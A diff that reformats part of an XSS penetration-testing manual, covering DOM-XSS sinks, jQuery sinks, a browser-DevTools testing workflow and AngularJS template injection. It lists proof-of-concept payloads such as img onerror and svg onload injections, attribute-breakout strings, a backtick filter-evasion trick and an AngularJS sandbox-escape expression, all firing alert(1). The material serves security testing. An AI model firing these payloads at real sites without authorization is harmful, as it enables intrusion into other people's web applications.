@@ -1,12 +1,13 @@
 Advanced XSS Testing Manual
+===========================
 
 # Advanced XSS Testing Manual
 
 ## Comprehensive Guide to DOM-Based, Reflected, and Stored XSS
 
-## 1\. DOM-Based XSS Deep Dive
+## 1. DOM-Based XSS Deep Dive
 
-## Which Sinks Can Lead to DOM-XSS Vulnerabilities?
+### Which Sinks Can Lead to DOM-XSS Vulnerabilities?
 
 The following are some of the main sinks that can lead to **DOM-based XSS** vulnerabilities:
 
@@ -55,40 +56,40 @@ The following jQuery functions are also **sinks** that can introduce DOM-XSS vul
     
     | Sink Type | Dangerous Methods | Example Payload |
     | --- | --- | --- |
-    | HTML Injection | `innerHTML, outerHTML, document.write()` | `<img src=x onerror=alert(1)>` |
+    | HTML Injection | `innerHTML, outerHTML, document.write()` | `\x3Cimg src=x onerror=alert(1)\x3E` |
     | JS Execution | `eval(), setTimeout(), Function()` | `';alert(1);//` |
-    | jQuery | `$(), html(), append()` | `<img src=x onerror=alert(1)>` |
-    
+    | jQuery | `$(), html(), append()` | `\x3Cimg src=x onerror=alert(1)\x3E` |
 
 ### 1.2 Advanced Testing Techniques
 
 #### HTML Sink Testing
 
-1\. Inject: window.name = "xss\_test\_"+Math.random().toString(36).substr(2,8);
+1. Inject: `window.name = "xss_test_"+Math.random().toString(36).substr(2,8);`
 2. Open Chrome DevTools → Elements tab
 3. Search DOM (Ctrl+F) for your test string
 4. Analyze context:
-   - Inside attributes? Try: " autofocus onfocus=alert(1) x="
-   - Inside HTML? Try: <svg onload=alert(1)>
-   - Inside script? Try: '-alert(1)-'
+   - Inside attributes? Try: `" autofocus onfocus=alert(1) x="`
+   - Inside HTML? Try: `\x3Csvg onload=alert(1)\x3E`
+   - Inside script? Try: `'-alert(1)-'`
 
 #### JavaScript Sink Testing
 
-1\. Search all JS files (Ctrl+Shift+F) for:
-   - location.hash
-   - document.cookie
-   - window.name
+1. Search all JS files (Ctrl+Shift+F) for:
+   - `location.hash`
+   - `document.cookie`
+   - `window.name`
 2. Set breakpoints in suspicious sinks
 3. Trace variable flow through execution
 4. Test progressive payloads:
-   - Basic: alert(1)
-   - Context-aware: '-alert(1)-'
-   - Filter evasion: alert\`1\`
+   - Basic: `alert(1)`
+   - Context-aware: `'-alert(1)-'`
+   - Filter evasion: `alert\`1\``
 
 ### 1.3 Framework-Specific Vulnerabilities
 
 #### AngularJS XSS
 
+```html
 <div ng-app>
   {{constructor.constructor('alert(1)')()}}
 </div>
